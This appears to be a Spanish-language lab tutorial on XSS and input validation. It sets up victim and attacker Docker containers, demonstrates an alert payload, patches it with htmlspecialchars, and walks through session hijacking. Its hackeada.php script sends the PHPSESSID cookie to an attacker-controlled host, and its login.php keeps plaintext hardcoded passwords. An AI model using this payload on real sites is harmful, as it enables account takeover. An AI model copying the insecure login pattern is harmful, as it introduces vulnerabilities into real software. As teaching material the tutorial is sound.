---
typora-copy-images-to: ../assets/img
typora-root-url: ../
layout: post
categories:
conToc: true
title: Validacion
---

# Validación

Teniendo la estructura de directorios victima-atacante...



Dentro de victima/public_html crearemos el post.php con el siguiente contendio

![image-20220415103521642](/assets/img/image-20220415103521642.png)

Montamos el contenedor de víctima

```bash
sudo docker build -t victima
docker run --detach --rm -p8080:80 -v name:/data --name="victima" victima
```



Accedemos a localhost:8080/public_html/post.php e introducimos en el formulario el siguiente código

```bash
<script>alert('hackeado')</script>
```

![image-20220415104500832](/assets/img/image-20220415104500832.png)



Para securizar esta parte introduciremos el siguiente código dentro de post-php

```bash
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo htmlspecialchars($_POST["textarea"]) ?? "";
?>
</html>
```



A continuación crearemos un archivo php con el nombre robo-de-sesion dentro de la carpeta atacante/public_html

![image-20220415105716105](/assets/img/image-20220415105716105.png)



Dentro de victima/public_html crearemos un login.php con el siguiente contenido

```php
<?php
session_start();

//En una aplicación real, los usuarios estarían almaenados en la base de datos
$all_users = array ("mario" => "qwerty", "juan" => "123456");
$valid_users = array_keys($all_users);

$ya_registrado = $_SESSION['ya_registrado'] ?? false;


if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
	$usuario = $_POST['usuario'] ?? "";
	$password = $_POST['password'] ?? "";
    
	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $all_users[$usuario]);
	if ($ya_registrado){
		$_SESSION['ya_registrado'] = true;
		$_SESSION['usuario'] = $usuario;
	}
}

if ($ya_registrado){
	// Si llega aqui es porque es un usuario válido.
	echo "<p>Welcome " . $_SESSION['usuario'] . "</p>";
	echo "<p>Congratulations, you are into the system.</p>";
}else{
?>
	
	<form action='login.php' method='post'>
		Usuario: <input type='text' name = "usuario" id="usuario" value=""><br>
		Contraseña: <input type='password' name = "password" id = "password" value=""><br>
		<input type='submit' value='Enviar'>
	</form>
<?php
}
?>
```



Lo mismo con un logout.php

```php
<?php
//logout.php
session_start();
session_unset();
session_destroy();
//redirigimos a login.php
header('Location: login.php');
```



En el mismo sitio también crearemos un hackeada.php

```html
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
    Esta es una página que ha sido hackeada mediante XSS.
Al acceder, envía la cookie de sesión al sitio http://evil.local
<script>
var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
var myImage = new Image(1,1);
myImage.src = "http://127.0.0.1:8081/robo-de-sesion.php?session_robada=" + c;
</script>
</body>
</html>
```



Montamos el docker para el atacante

```bash
sudo docker build -t atacante .
sudo docker run --detach --rm -p8081:80 -v name:/data --name="atacante" atacante
```



Entramos en el login.php

![image-20220415110902859](/assets/img/image-20220415110902859.png)



Accedemos a heackeada.php

![image-20220415110959849](/assets/img/image-20220415110959849.png)



Nos aparecerá el PHPSSID si vamos a Investigar/Red/ y recargamos la página

![image-20220415111224625](/assets/img/image-20220415111224625.png)



Abrimos una nueva página y volvemos a acceder al login.php sin poner ningún dato. Vamos otra vez a Investigar/Red y ponemos el ID

![image-20220415111840762](/assets/img/image-20220415111840762.png)



Iniciaremos sesión como Juan

![image-20220415111925991](/assets/img/image-20220415111925991.png)
